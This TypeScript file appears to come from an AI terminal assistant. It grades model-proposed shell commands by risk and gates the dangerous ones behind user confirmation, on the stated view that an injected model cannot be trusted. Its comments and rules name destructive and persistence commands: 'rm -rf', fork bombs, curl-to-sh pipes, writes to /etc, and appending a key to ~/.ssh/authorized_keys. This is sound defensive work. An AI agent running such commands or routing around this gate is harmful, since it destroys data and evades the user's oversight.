import { chat, AVAILABLE_TOOLS, ChatCancelledError, ChatTimeoutError, captureChatConfiguration } from './llm'
import { prepareAgentContext } from './contextCompaction'
import { executeCommand, startCommand, captureTerminal, collectOutput, sendTerminalKey } from './terminalAgent'
import type { ExecuteResult } from './terminalAgent'
import { useAIStore } from '../stores/aiStore'
import { useSettingsStore } from '../stores/settingsStore'
import { useTabStore } from '../stores/tabStore'
import { usePanelStore } from '../stores/panelStore'
import { useSessionStore } from '../stores/sessionStore'
import { useSkillStore } from '../stores/skillStore'
import { loadRemoteMCPTools, toAgentToolEntry, callRemoteMCPTool, isRemoteMCPTool } from './mcpTools'
import { GetSkillFile, ListSkillFiles } from '../../bindings/github.com/ys-ll/uniterm/app'
import type { AIAttachment, AIMessage } from '../types/ai'
import { Events } from '@wailsio/runtime'
import {
  InputValidationError,
  validateRequiredString,
  validateObject,
} from '../utils/runtimeTypeCheck'

// Global token listener management: only one runAgent instance should receive
// ai:token events at a time. Registering a new listener automatically cancels
// the previous one, preventing duplicate streaming into multiple assistant
// messages when a stop/continue sequence races. F-315: each register call
// bumps a generation counter; the returned cleanup only clears module state
// when its generation still matches, so an early-return path that gets
// superseded by a re-entry (approveTool → runAgent; rejectTool / answer /
// dismissQuestion setTimeout→runAgent) can't accidentally clobber a newer
// pair by running its stale cleanup.
let activeTokenUnsubscribe: (() => void) | null = null
let activeAssistantMsg: AIMessage | null = null
let activeGeneration = 0

function registerTokenListener(callback: (data: any) => void): () => void {
  activeTokenUnsubscribe?.()
  activeTokenUnsubscribe =Events.On('ai:token', (ev) => callback(ev.data))
  activeGeneration++
  const myGeneration = activeGeneration
  return () => {
    if (myGeneration !== activeGeneration) return
    activeTokenUnsubscribe?.()
    activeTokenUnsubscribe = null
    activeAssistantMsg = null
  }
}

function setActiveAssistantMsg(msg: AIMessage | null) {
  activeAssistantMsg = msg
}

function getActivePanel() {
  const tabStore = useTabStore()
  const panelStore = usePanelStore()

  // Check for AI-locked panel first
  const lockedPanelId = tabStore.getAILockedPanel()
  if (lockedPanelId) {
    return panelStore.getPanel(lockedPanelId)
  }

  // Fall back to active panel based on tab type
  const activeTab = tabStore.activeTab
  if (!activeTab) return undefined

  if (activeTab.type === 'terminal' || activeTab.type === 'settings') {
    return panelStore.getPanel(activeTab.panelId)
  }

  if (activeTab.type === 'workspace' && activeTab.activePanelId) {
    return panelStore.getPanel(activeTab.activePanelId)
  }

  return undefined
}

function hasActiveSession(): boolean {
  const panel = getActivePanel()
  return !!panel?.sessionId
}

type RiskLevel = 'read' | 'write' | 'dangerous'

export const VALID_RISK: readonly RiskLevel[] = ['read', 'write', 'dangerous']

// ── 规则说明（前后端共用，必须与 backend/mcp/risk.go 以及
//    backend/mcp/risk_test.go / 本文件测试的注释保持逐条一致）──────────────────
//
// RISK RULES v2 — backend/mcp/risk.go == frontend/src/services/agent.ts
//
//  0. 空命令/缺失命令 → dangerous（默认关闭）。
//  1. 整行包含 ":|:" 或 "|:&"（小写）→ dangerous（fork bomb，先于分割判断）。
//  2. 整行按 `;`、换行、`|`、`&` 分割为若干段；重定向内部的 `&` 不是分隔符
//     （`2>&1`、`>&2`、`&>file` 不切割）。
//  3. 每段（匹配时小写；head 逐 token 归一）：
//     a. 剥 wrapper（始终保留 ≥1 个 token，绝不越界）：环境变量赋值（token 含
//     `=`）、sudo/doas/nohup/time/nice/env/command/exec。wrapper 识别走
//     normalizeHead，所以 `/usr/bin/sudo`、`C:\x\sudo.exe` 同样被识别。每个
//     wrapper 用自己的选项表解析前导选项（带单独参数的选项连同参数一起跳过；
//     `--` 终止选项）。**表中没有的 wrapper 选项 → dangerous（F-02：未知选项
//     可能携带 payload，如 nice/time/env 的隐藏参数）**；
//     `env -S/--split-string` → dangerous（直接执行任意命令串）。
//     仅剩一个赋值 token 时判 read（不执行任何命令）。
//     b. head 归一：去引号、去前导 `\`、`\`→`/`、取 path.Base、小写、去 `.exe`
//     （覆盖 `/bin/rm -rf /`、`\rm -rf`、`command rm -rf`、C:\...\rm.exe）。
//     c. 嵌套 shell 代码分两档（F-02）：
//     - 隐藏执行体 —— 解释器 `-c/-e/--eval`（sh/bash/zsh/dash/ash/ksh/csh/
//     tsh/fish/cmd/powershell/pwsh/python/node/perl/ruby）、`eval …`、
//     `xargs …` —— payload 无法静态判断，**一律 dangerous**；
//     - `$( … )`、反引号、`find -exec/-execdir <cmd>` —— 递归按本规则分类，
//     结果至少 write；内层 dangerous 直接判 dangerous。
//     d. dangerous：`rm` 带递归+强制（-rf/-fr 或 -r 与 -f 分写）、mkfs*、
//     `dd of=/dev/*`、shutdown/reboot/halt/poweroff/init/fdisk/parted/wipefs/
//     shred、`find -delete`、重定向目标位于 /etc /boot /sys /dev /proc/sys
//     之下（/dev/null 豁免）、cp/mv/tee/install/rsync/dd/truncate 的文件
//     参数位于上述危险路径。
//     e. 每个重定向目标单独判定：`/dev/null` 忽略，其余目标至少 write
//     （`echo k >> ~/.ssh/authorized_keys 2>/dev/null` 必须非 read）。
//     f. 只读放行：head 在 READ_HEADS 中，或 head 在 READ_SUBS 中且第二个
//     token 是列出的只读子命令（git status、kubectl get、systemctl
//     status…），且没有其它 write 信号 → read；只读命令带写选项/写参数
//     （F-02：sort -o/--output、date -s/--set、find -fprint/-fprint0/-fprintf/
//     -fls/-ok/-okdir、git --output、hostname 带参数）→ 至少 write；
//     交互式分页器（less/more/man/top）已移出只读表（可执行子命令）；
//     **其它任何命令默认至少 write**。
//  4. 整行 `curl|wget|fetch … | sh|bash|zsh|sudo sh|sudo bash` → dangerous
//     （classifyDownloadPipe，由调用方叠加）。
//
// The model is untrusted: its self-reported `risk` may only RAISE the local
// grade, never lower it (see getRisk).

const RISK_ORDER: Record<RiskLevel, number> = { read: 0, write: 1, dangerous: 2 }

/** classifyCommand grades a shell command line (RISK RULES v2). */
export function classifyCommand(cmd: string): RiskLevel {
  if (!cmd.trim()) return 'dangerous' // default closed
  const low = cmd.toLowerCase()
  if (low.includes(':|:') || low.includes('|:&')) return 'dangerous'
  let overall: RiskLevel = 'read'
  for (const seg of splitSegments(cmd)) {
    const r = classifySegment(seg)
    if (r === 'dangerous') return 'dangerous'
    if (r === 'write') overall = 'write'
  }
  return overall
}

/** Split on ;, newline, | and & — but not on '&' inside a redirection. */
function splitSegments(cmd: string): string[] {
  const segs: string[] = []
  let start = 0
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i]
    if (c === ';' || c === '\n' || c === '|') {
      segs.push(cmd.slice(start, i))
      start = i + 1
      continue
    }
    if (c === '&') {
      const prev = i > 0 ? cmd[i - 1] : ''
      const next = i + 1 < cmd.length ? cmd[i + 1] : ''
      if (prev === '>' || next === '>') continue // fd dup or "&>"
      segs.push(cmd.slice(start, i))
      start = i + 1
    }
  }
  segs.push(cmd.slice(start))
  return segs
}

const WRAPPERS: Record<string, true> = {
  sudo: true, doas: true, nohup: true, time: true, nice: true, env: true,
  command: true, exec: true,
}

// F-02: each wrapper's option vocabulary — `flags` take no argument,
// `argOpts` consume the following word. Anything outside the table is
// unknown → dangerous (default closed). Keys are lowercase because matching
// runs on normalizeHead/toLowerCase output ("-C"/"-c" and "-U"/"-u"
// collapse — both spellings take an argument either way). Keep in sync with
// wrapperSpecs in backend/mcp/risk.go.
interface WrapperSpec { flags: string[]; argOpts: string[] }

const WRAPPER_SPECS: Record<string, WrapperSpec> = {
  sudo: {
    flags: [
      '-a', '-b', '-e', '-h', '-i', '-k', '-l', '-n', '-s', '-v',
      '--askpass', '--background', '--edit', '--help', '--list',
      '--login', '--non-interactive', '--preserve-env', '--reset-timestamp',
      '--shell', '--stdin', '--validate', '--version',
    ],
    argOpts: [
      '-c', '-d', '-g', '-p', '-r', '-t', '-T', '-u',
      '--chdir', '--close-from', '--command-timeout', '--group',
      '--host', '--other-user', '--prompt', '--role', '--type', '--user',
    ],
  },
  doas: {
    flags: ['-a', '-b', '-s', '--help', '--version'],
    argOpts: [
      '-c', '-d', '-g', '-p', '-r', '-t', '-u',
      '--group', '--prompt', '--role', '--type', '--user',
    ],
  },
  nohup: { flags: ['--help', '--version'], argOpts: [] },
  time: {
    flags: ['-a', '-p', '-v', '--append', '--portability', '--verbose', '--help', '--version'],
    argOpts: ['-f', '-o', '--format', '--output'],
  },
  nice: {
    flags: ['--help', '--version'],
    argOpts: ['-n', '--adjustment'],
  },
  env: {
    flags: ['-i', '--debug', '--help', '--ignore-environment', '--version'],
    argOpts: ['-c', '-p', '-s', '--chdir', '--path', '--split-string', '--unset', '-u'],
  },
  command: { flags: ['-p', '-v'], argOpts: [] },
  exec: { flags: ['-c', '-i', '-l'], argOpts: ['-a'] },
}

/** Interpreters that execute a code string passed through an option. */
const EVAL_FLAG_HEADS: Record<string, string[]> = {
  sh: ['-c'], bash: ['-c'], zsh: ['-c'], dash: ['-c'], ash: ['-c'],
  ksh: ['-c'], csh: ['-c'], tcsh: ['-c'], fish: ['-c'],
  cmd: ['/c', '-c'], powershell: ['-c', '-command'], pwsh: ['-c', '-command'],
  python: ['-c'], python3: ['-c'], node: ['-e', '--eval'],
  perl: ['-e'], ruby: ['-e'],
}

const DANGER_HEADS: Record<string, true> = {
  mkfs: true, shutdown: true, reboot: true, halt: true, poweroff: true,
  init: true, fdisk: true, parted: true, wipefs: true, shred: true,
}

const DANGEROUS_PATHS = ['/etc/', '/boot/', '/sys/', '/dev/', '/proc/sys/']

const REDIRECT_SEP: Record<string, true> = {
  ' ': true, '\t': true, '\n': true, ';': true, '|': true, '&': true,
  '<': true, '>': true, '(': true, ')': true,
}

/** A token carrying an env assignment ("FOO=1"), not a redirection. */
function isAssignmentToken(word: string): boolean {
  return word.includes('=') && !word.includes('<') && !word.includes('>')
}

/**
 * Strip env assignments and privileged/nohup wrappers so "sudo -u root rm" is
 * judged as "rm". Wrapper detection goes through normalizeHead, so
 * "/usr/bin/sudo" and "C:\\x\\sudo.exe" are recognised too. Each wrapper
 * consumes its own leading options via its option table. Always keeps at
 * least one token: a bare wrapper word can never run past the end of the
 * list.
 *
 * F-02: an option the wrapper's table does not know grades 'dangerous' —
 * unknown wrapper options may carry a payload ("nice -n 5 rm -rf …" and
 * "env -S 'rm -rf …'" previously fell through to 'write' and skipped the
 * confirmation dialog). env -S/--split-string always grades dangerous.
 */
function stripWrappers(words: string[]): { head: string; rest: string[]; risk: RiskLevel } {
  let risk: RiskLevel = 'read'
  let rest = words.slice()
  while (rest.length > 1 && (WRAPPERS[normalizeHead(rest[0])] || isAssignmentToken(rest[0]))) {
    const w = normalizeHead(rest[0])
    rest = rest.slice(1)
    if (WRAPPERS[w]) {
      const r = stripWrapperOptions(w, rest)
      if (RISK_ORDER[r.risk] > RISK_ORDER[risk]) risk = r.risk
      rest = r.rest
    }
  }
  if (rest.length === 0) return { head: '', rest, risk }
  return { head: rest[0], rest, risk }
}

/**
 * Consume a wrapper's leading options using its table. "--" ends option
 * parsing (the next token is the command) and assignment tokens are skipped.
 * An option the table does not know, or env's -S/--split-string, grades
 * 'dangerous' (F-02: default closed).
 */
function stripWrapperOptions(wrapper: string, words: string[]): { risk: RiskLevel; rest: string[] } {
  const spec = WRAPPER_SPECS[wrapper]
  if (!spec) {
    // WRAPPERS only admits wrappers listed in WRAPPER_SPECS; treat a table
    // gap as unknown instead of silently passing options through.
    return { risk: 'dangerous', rest: words }
  }
  const flags = new Set(spec.flags)
  const argOpts = new Set(spec.argOpts)
  let out = words.slice()
  while (out.length > 1 && (out[0].startsWith('-') || isAssignmentToken(out[0]))) {
    const w = out[0].toLowerCase()
    out = out.slice(1)
    if (isAssignmentToken(w)) continue
    if (w === '--') break // end of options: the remaining words are the command
    let name = w
    const eq = w.indexOf('=')
    if (eq >= 0) name = w.slice(0, eq)
    if (wrapper === 'env' && (name === '-s' || name === '--split-string')) {
      // "env -S 'cmd'" executes its argument as a command line.
      return { risk: 'dangerous', rest: out }
    }
    if (!flags.has(name) && !argOpts.has(name)) return { risk: 'dangerous', rest: out }
    if (!w.includes('=') && argOpts.has(name) && out.length > 1) out = out.slice(1)
  }
  return { risk: 'read', rest: out }
}

/** Quotes dropped, '\' folded to '/', basename, lowercase, ".exe" stripped. */
function normalizeHead(head: string): string {
  let h = head.trim().replace(/^['"]+|['"]+$/g, '')
  h = h.replace(/^\\+/, '').replace(/\\/g, '/')
  const i = h.lastIndexOf('/')
  if (i >= 0) h = h.slice(i + 1)
  h = h.toLowerCase()
  return h.endsWith('.exe') ? h.slice(0, -4) : h
}

/** Command substitutions: bodies of $( … ) and ` … ` spans. */
function substitutions(seg: string): string[] {
  const out: string[] = []
  for (let i = 0; i < seg.length; i++) {
    if (seg[i] === '$' && seg[i + 1] === '(') {
      let depth = 1
      let j = i + 2
      while (j < seg.length && depth > 0) {
        if (seg[j] === '(') depth++
        else if (seg[j] === ')') depth--
        j++
      }
      out.push(seg.slice(i + 2, j))
      i = j - 1
      continue
    }
    if (seg[i] === '`') {
      const end = seg.indexOf('`', i + 1)
      if (end >= 0) {
        out.push(seg.slice(i + 1, end))
        i = end
      } else {
        out.push(seg.slice(i + 1))
        i = seg.length
      }
    }
  }
  return out
}

/**
 * Recursively judged embedded shell code: substitutions, backticks and
 * find -exec bodies. These grade at least write (they hide the inner command
 * from the head-based rules). Hard execution bodies — interpreter -c/-e,
 * eval, xargs — are handled by hardNestedSnippets and grade dangerous.
 */
function nestedSnippets(seg: string, head: string, words: string[]): string[] {
  const out: string[] = substitutions(seg)
  if (head === 'find') {
    for (let i = 0; i < words.length; i++) {
      if ((words[i] === '-exec' || words[i] === '-execdir') && i + 1 < words.length) {
        out.push(words.slice(i + 1).join(' '))
        break
      }
    }
  }
  return out
}

/**
 * Hidden *execution bodies* whose payload cannot be judged statically:
 * interpreter -c/-e/--eval strings, eval arguments and xargs command tails
 * (F-02). Any hit grades dangerous — mirror of hardNestedSnippets in
 * backend/mcp/risk.go.
 */
function hardNestedSnippets(head: string, words: string[]): string[] {
  const out: string[] = []
  const flags = EVAL_FLAG_HEADS[head]
  if (flags) {
    for (let i = 1; i < words.length; i++) {
      if (flags.includes(words[i].toLowerCase()) && i + 1 < words.length) {
        out.push(words.slice(i + 1).join(' '))
        break
      }
    }
  }
  if (head === 'eval' && words.length > 1) out.push(words.slice(1).join(' '))
  if (head === 'xargs' && words.length > 1) out.push(words.slice(1).join(' '))
  return out
}

/** File targets of the segment's redirections (fd dups / quotes excluded). */
function redirectTargets(seg: string): string[] {
  const targets: string[] = []
  for (let i = 0; i < seg.length; i++) {
    const c = seg[i]
    if (c === "'" || c === '"') {
      i++
      while (i < seg.length && seg[i] !== c) i++
      continue
    }
    if (c !== '>') continue
    let j = i + 1
    while (j < seg.length && seg[j] === '>') j++
    if (seg[j] === '|') j++ // ">|" noclobber
    while (j < seg.length && (seg[j] === ' ' || seg[j] === '\t')) j++
    if (seg[j] === '&') { // "2>&1" / ">&2"
      j++
      while (j < seg.length && seg[j] >= '0' && seg[j] <= '9') j++
      i = j - 1
      continue
    }
    const start = j
    while (j < seg.length && !REDIRECT_SEP[seg[j]]) j++
    if (start < j) {
      targets.push(seg.slice(start, j).toLowerCase().replace(/^['"]+|['"]+$/g, ''))
    }
    i = j - 1
  }
  return targets
}

const READ_HEADS: Record<string, true> = {
  // POSIX / Unix-like inspection.
  // F-02: interactive pagers (less/more/man/top) were removed — they accept
  // shell escapes ("!sh") / spawn child processes. jq stays: every jq option
  // only reads files, none writes or execs. Mirror of readOnlyHeads in
  // backend/mcp/risk.go.
  ag: true, ack: true, basename: true, cat: true, cd: true, cmp: true,
  column: true, cut: true, date: true, df: true, diff: true, dirname: true,
  dig: true, du: true, echo: true, egrep: true, env: true, false: true,
  file: true, find: true, fgrep: true, free: true, grep: true, groups: true,
  head: true, hexdump: true, history: true, host: true, hostname: true,
  id: true, journalctl: true, jq: true, jobs: true, ls: true,
  lscpu: true, lsof: true, lsblk: true, md5sum: true,
  netstat: true, nproc: true, nslookup: true, od: true, ping: true,
  printenv: true, printf: true, ps: true, pwd: true, readlink: true,
  realpath: true, rg: true, seq: true, sha1sum: true, sha256sum: true,
  shasum: true, sleep: true, sort: true, ss: true, stat: true, strings: true,
  tail: true, test: true, traceroute: true, tr: true, tree: true,
  true: true, tty: true, type: true, uname: true, uniq: true, uptime: true,
  wc: true, which: true, who: true, whereis: true, whoami: true, xxd: true,
  // Windows / PowerShell inspection
  dir: true, 'format-list': true, 'format-table': true,
  'get-childitem': true, 'get-command': true, 'get-computerinfo': true,
  'get-content': true, 'get-date': true, 'get-item': true, 'get-process': true,
  'get-service': true, ipconfig: true, 'measure-object': true,
  'out-string': true, 'select-string': true, systeminfo: true, tasklist: true,
  'test-path': true, ver: true, 'where-object': true,
}

/** Read-only subcommands of multi-action tools (everything else ≥ write). */
const READ_SUBS: Record<string, string[]> = {
  git: ['status', 'log', 'diff', 'show', 'blame', 'grep', 'rev-parse', 'describe', 'ls-files', 'shortlog', 'reflog', 'version', 'help'],
  kubectl: ['get', 'describe', 'logs', 'top', 'version', 'explain', 'api-resources', 'api-versions', 'cluster-info'],
  docker: ['ps', 'images', 'logs', 'inspect', 'version', 'info', 'stats', 'top', 'port', 'history', 'diff', 'events', 'df', 'search'],
  podman: ['ps', 'images', 'logs', 'inspect', 'version', 'info', 'stats', 'top', 'port', 'history', 'diff', 'events', 'df', 'search'],
  systemctl: ['status', 'is-active', 'is-enabled', 'is-failed', 'list-units', 'list-unit-files', 'list-timers', 'list-sockets', 'show', 'cat', 'get', 'help'],
  service: ['status'],
  apt: ['list', 'search', 'show', 'policy', 'check', 'depends'],
  'apt-get': ['list', 'search', 'show', 'policy', 'check', 'depends'],
  dnf: ['list', 'info', 'search', 'provides', 'repolist', 'check-update'],
  yum: ['list', 'info', 'search', 'provides', 'repolist', 'check-update'],
  pip: ['list', 'show', 'freeze', 'check', 'debug'],
  pip3: ['list', 'show', 'freeze', 'check', 'debug'],
  npm: ['ls', 'list', 'view', 'info', 'outdated', 'search', 'why', 'ping', 'audit', 'root', 'prefix'],
  yarn: ['ls', 'list', 'view', 'info', 'outdated', 'search', 'why', 'ping', 'audit'],
  pnpm: ['ls', 'list', 'view', 'info', 'outdated', 'search', 'why', 'ping', 'audit'],
  brew: ['list', 'search', 'info', 'outdated', 'deps', 'config', 'doctor'],
  cargo: ['search', 'info', 'tree', 'metadata', 'verify-project'],
  gem: ['list', 'query', 'search', 'info', 'dependency'],
  go: ['version', 'env', 'list', 'doc', 'help'],
}

function classifySegment(seg: string): RiskLevel {
  const s = seg.trim()
  if (!s) return 'read'
  const words = s.split(/\s+/)
  const { head: rawHead, rest, risk: wrapRisk } = stripWrappers(words)
  if (wrapRisk === 'dangerous') {
    // F-02: an unknown wrapper option or env -S hides the executed payload —
    // default closed.
    return 'dangerous'
  }
  // A lone assignment ("FOO=1") runs no command.
  if (rest.length === 0 || isAssignmentToken(rawHead)) return 'read'
  const head = normalizeHead(rawHead)
  const joined = s.toLowerCase()
  if (joined.includes(':|:') || joined.includes('|:&')) return 'dangerous'

  // F-02: hidden execution bodies (interpreter -c/-e, eval, xargs) grade
  // dangerous outright — their payload cannot be judged statically.
  if (hardNestedSnippets(head, words).length > 0) return 'dangerous'

  // Nested shell code grades at least write; a dangerous inner grade wins.
  let risk: RiskLevel = 'read'
  for (const inner of nestedSnippets(s, head, words)) {
    if (!inner.trim()) { risk = 'write'; continue }
    if (classifyCommand(inner) === 'dangerous') return 'dangerous'
    risk = 'write' // floor: a nested snippet is at least a write (Go classifyNested)
  }

  // rm -rf / mkfs* / dd of=/dev/* / system-kill heads / find -delete
  const rmWords = words.map(w => w.toLowerCase())
  if (head === 'rm') {
    const hasRf = rmWords.some(w => w.includes('-rf') || w.includes('-fr'))
    const hasF = rmWords.some(w => w === '-f' || w.includes('-f'))
    if (hasRf || (rmWords.includes('-r') && hasF) || joined.includes('rm -rf')) return 'dangerous'
  }
  if (head.startsWith('mkfs') || (head === 'dd' && joined.includes('of=/dev/')) || DANGER_HEADS[head]) {
    return 'dangerous'
  }
  if (head === 'find' && rmWords.includes('-delete')) return 'dangerous'

  for (const target of redirectTargets(s)) {
    if (target === '/dev/null') continue
    const t = target.toLowerCase().replace(/^['"]+|['"]+$/g, '')
    if (DANGEROUS_PATHS.some(d => t.startsWith(d) || t === d.slice(0, -1))) return 'dangerous'
    risk = 'write'
  }

  if (['cp', 'mv', 'tee', 'install', 'rsync', 'dd', 'truncate'].includes(head)) {
    for (const w of rest.slice(1)) {
      const path = w.toLowerCase().replace(/^['"]+|['"]+$/g, '')
      if (DANGEROUS_PATHS.some(d => path.startsWith(d) || path === d.slice(0, -1))) return 'dangerous'
    }
  }

  // Default closed: only the read allowlist (heads and known read-only
  // subcommands) may grade read; every other command is at least a write.
  if (risk === 'read') {
    if (!isReadOnly(head, words)) risk = 'write'
    else if (hasUnsafeReadOption(head, rest)) {
      // F-02: a "read" command carrying a write option (sort -o,
      // git log --output, find -fprint, date -s …) must not grade read.
      risk = 'write'
    } else if (head === 'hostname' && hasPositionalArg(rest)) {
      // F-02: "hostname <name>" sets the hostname.
      risk = 'write'
    }
  }
  return risk
}

/** Read allowlist lookup: pure read heads, or listed read-only subcommands. */
function isReadOnly(head: string, words: string[]): boolean {
  if (READ_HEADS[head]) return true
  const subs = READ_SUBS[head]
  if (subs === undefined || words.length < 2) return false
  return subs.includes(words[1].toLowerCase())
}

// F-02: options that turn an otherwise read-only head into at least a write:
// the command still looks like an inspection tool but now writes a file or
// mutates state (appendix A of the audit doc). Matching is on the lowercased
// option name up to "=". Mirror of readUnsafeOptions in backend/mcp/risk.go.
const READ_UNSAFE_OPTIONS: Record<string, string[]> = {
  sort: ['-o', '--output'],
  date: ['-s', '--set'],
  find: ['-fprint', '-fprint0', '-fprintf', '-fls', '-ok', '-okdir'],
  git: ['--output'],
}

function hasUnsafeReadOption(head: string, words: string[]): boolean {
  const opts = READ_UNSAFE_OPTIONS[head]
  if (!opts) return false
  for (let i = 1; i < words.length; i++) {
    const w = words[i]
    if (!w.startsWith('-')) continue
    const lw = w.toLowerCase()
    const eq = lw.indexOf('=')
    const name = eq >= 0 ? lw.slice(0, eq) : lw
    if (opts.includes(name)) return true
  }
  return false
}

/** Non-option operand after head — e.g. "hostname myhost" sets the name. */
function hasPositionalArg(words: string[]): boolean {
  for (let i = 1; i < words.length; i++) {
    if (!words[i].startsWith('-')) return true
  }
  return false
}

/** "curl … | sh" upgrades the whole line to dangerous. */
function classifyDownloadPipe(cmd: string): boolean {
  const low = cmd.toLowerCase()
  if (!low.includes('|')) return false
  for (const left of ['curl', 'wget', 'fetch']) {
    if (!low.includes(left)) continue
    for (const right of ['| sh', '|sh', '| bash', '|bash', '| zsh', '|zsh', '| sudo sh', '| sudo bash']) {
      if (low.includes(right)) return true
    }
  }
  return false
}

/**
 * getRisk grades a tool call locally (RISK RULES v2, mirrored from
 * backend/mcp/risk.go). The model's self-reported `risk` may only raise the
 * level — an injected model labeling `rm -rf ~` as "read" no longer skips the
 * confirmation dialog.
 */
export function getRisk(tu: { name: string; input: Record<string, unknown> }): RiskLevel {
  if (tu.name !== 'execute_command' && tu.name !== 'start_command') return 'dangerous'
  const cmd = typeof tu.input.command === 'string' ? tu.input.command : ''
  const computed: RiskLevel = !cmd
    ? 'dangerous'
    : classifyDownloadPipe(cmd) ? 'dangerous' : classifyCommand(cmd)
  const claimed = tu.input.risk
  if (claimed === 'read' || claimed === 'write' || claimed === 'dangerous') {
    // The model may only RAISE the level, never lower it.
    return RISK_ORDER[claimed] > RISK_ORDER[computed] ? claimed : computed
  }
  return computed
}

/**
 * Display string for a pending external MCP call: qualified name + JSON
 * arguments, truncated for the confirm panel. The pendingCommand keeps the
 * complete args in `mcpTool.args` — only this preview is shortened.
 */
function formatRemoteMCPCommand(qualifiedName: string, args: Record<string, unknown>): string {
  let json: string
  try {
    json = JSON.stringify(args ?? {})
  } catch {
    json = '"<unserializable arguments>"'
  }
  const MAX_ARGS = 600
  if (json.length > MAX_ARGS) {
    json = `${json.slice(0, MAX_ARGS)}… (+${json.length - MAX_ARGS} chars)`
  }
  return `${qualifiedName} ${json}`
}

function shouldConfirm(risk: RiskLevel): boolean {
  const store = useAIStore()
  switch (store.mode) {
    case 'confirm_all': return true
    case 'confirm_write': return risk !== 'read'
    case 'confirm_dangerous': return risk === 'dangerous'
    case 'bypass': return false
    default: return risk !== 'read'
  }
}

// ---- Tool input validators (FE-P0-3) ----
// Hand-rolled shape checks for the 7 most-used tools. The LLM is untrusted;
// `tu.input.command as string` would yield "[object Object]" for `command: {}`.
// On any failure we throw InputValidationError so the dispatch site can
// surface the error back to the model and continue the agent loop.

function positiveMilliseconds(value: unknown, fallback: number): number {
  return typeof value === 'number' && Number.isFinite(value) && value > 0 ? value : fallback
}

function nonNegativeLines(value: unknown, fallback: number, name: string): number {
  if (value === undefined || value === null) return fallback
  if (typeof value !== 'number' || !Number.isSafeInteger(value) || value < 0) {
    throw new InputValidationError(`${name} must be a non-negative integer`)
  }
  return value
}

interface ExecuteCommandInput {
  command: string
  timeout_ms: number
  head_lines: number
  tail_lines: number
  panel?: string
}

function validateExecuteCommandInput(raw: unknown): ExecuteCommandInput {
  const obj = validateObject(raw, 'execute_command input')
  return {
    command: validateRequiredString(obj.command, 'command'),
    timeout_ms: positiveMilliseconds(obj.timeout_ms, 60000),
    head_lines: nonNegativeLines(obj.head_lines, 50, 'head_lines'),
    tail_lines: nonNegativeLines(obj.tail_lines, 300, 'tail_lines'),
    panel: typeof obj.panel === 'string' ? obj.panel : undefined,
  }
}

interface StartCommandInput {
  command: string
  panel?: string
}

function validateStartCommandInput(raw: unknown): StartCommandInput {
  const obj = validateObject(raw, 'start_command input')
  return {
    command: validateRequiredString(obj.command, 'command'),
    panel: typeof obj.panel === 'string' ? obj.panel : undefined,
  }
}

interface SendTerminalKeyInput {
  input?: string
  control?: 'ctrl_c' | 'ctrl_d' | 'enter'
  send_enter: boolean
  panel?: string
}

function validateSendTerminalKeyInput(raw: unknown): SendTerminalKeyInput {
  const obj = validateObject(raw, 'send_terminal_key input')
  const control = obj.control
  let validatedControl: 'ctrl_c' | 'ctrl_d' | 'enter' | undefined
  if (control === undefined) {
    validatedControl = undefined
  } else if (control === 'ctrl_c' || control === 'ctrl_d' || control === 'enter') {
    validatedControl = control
  } else {
    throw new InputValidationError(`control must be one of ctrl_c, ctrl_d, enter`)
  }
  return {
    input: typeof obj.input === 'string' ? obj.input : undefined,
    control: validatedControl,
    send_enter: typeof obj.send_enter === 'boolean' ? obj.send_enter : true,
    panel: typeof obj.panel === 'string' ? obj.panel : undefined,
  }
}

interface AskUserInput {
  question: string
  header?: string
  options: Array<{ label: string; description: string }>
  multiSelect: boolean
}

function validateAskUserInput(raw: unknown): AskUserInput {
  const obj = validateObject(raw, 'ask_user input')
  const rawOptions = obj.options
  const options: Array<{ label: string; description: string }> = []
  if (Array.isArray(rawOptions)) {
    for (const item of rawOptions) {
      if (item && typeof item === 'object' && !Array.isArray(item)) {
        const o = item as Record<string, unknown>
        const label = typeof o.label === 'string' ? o.label : ''
        const description = typeof o.description === 'string' ? o.description : ''
        if (label) options.push({ label, description })
      }
    }
  }
  return {
    question: validateRequiredString(obj.question, 'question'),
    header: typeof obj.header === 'string' ? obj.header : undefined,
    options,
    multiSelect: typeof obj.multiSelect === 'boolean' ? obj.multiSelect : false,
  }
}

interface SaveSkillInput {
  name: string
  description: string
  body: string
}

function validateSaveSkillInput(raw: unknown): SaveSkillInput {
  const obj = validateObject(raw, 'save_skill input')
  return {
    name: validateRequiredString(obj.name, 'name'),
    description: validateRequiredString(obj.description, 'description'),
    body: validateRequiredString(obj.body, 'body'),
  }
}

interface UseSkillInput {
  name: string
}

function validateUseSkillInput(raw: unknown): UseSkillInput {
  const obj = validateObject(raw, 'use_skill input')
  return { name: validateRequiredString(obj.name, 'name') }
}

interface ReadSkillFileInput {
  name: string
  path: string
}

function validateReadSkillFileInput(raw: unknown): ReadSkillFileInput {
  const obj = validateObject(raw, 'read_skill_file input')
  return {
    name: validateRequiredString(obj.name, 'name'),
    path: validateRequiredString(obj.path, 'path'),
  }
}

// F-312: cap the bytes stored in a tool message so a single tool call can't
// blow up the conversation computed. The model can still see the beginning
// and end of long output; the in-between is dropped with a clear marker.
// 32 KB total, 8 KB head, 16 KB tail — biased to the tail because error
// messages and final state almost always live at the bottom of terminal output.
const TOOL_RESULT_MAX_BYTES = 32 * 1024
const TOOL_RESULT_HEAD_BYTES = 8 * 1024
const TOOL_RESULT_TAIL_BYTES = 16 * 1024

function capToolResult(text: string): string {
  if (text.length <= TOOL_RESULT_MAX_BYTES) return text
  const head = text.slice(0, TOOL_RESULT_HEAD_BYTES)
  const tail = text.slice(text.length - TOOL_RESULT_TAIL_BYTES)
  const omitted = text.length - TOOL_RESULT_HEAD_BYTES - TOOL_RESULT_TAIL_BYTES
  return `${head}\n\n─────── [已截断: 工具结果共 ${text.length} 字节, 已省略 ${omitted} 字节] ────────\n调整工具参数（如 head_lines / tail_lines）或分段调用以查看被截断部分。\n\n${tail}`
}

function formatExecuteResult(result: ExecuteResult): string {
  if (result.completed ?? (!result.cancelled && !result.timedOut && result.exitCode >= 0)) {
    return `${result.output}\n\n[COMMAND COMPLETED]`
  }
  if (!result.timedOut) return `${result.output}\n\n[COMMAND COMPLETION UNCONFIRMED]`
  // Put the timeout guidance right after the status line so the AI sees the
  // verdict before reading the follow-up advice.
  return `${result.output}\n\n[COMMAND TIMED OUT]\n\n`
    + `⚠️ The command did not finish within the timeout and may still be running.\n`
    + `Do not resend the same command.\n`
    + `• If the output shows progress (percentages, scrolling filenames, etc.) → use collect_output to keep waiting\n`
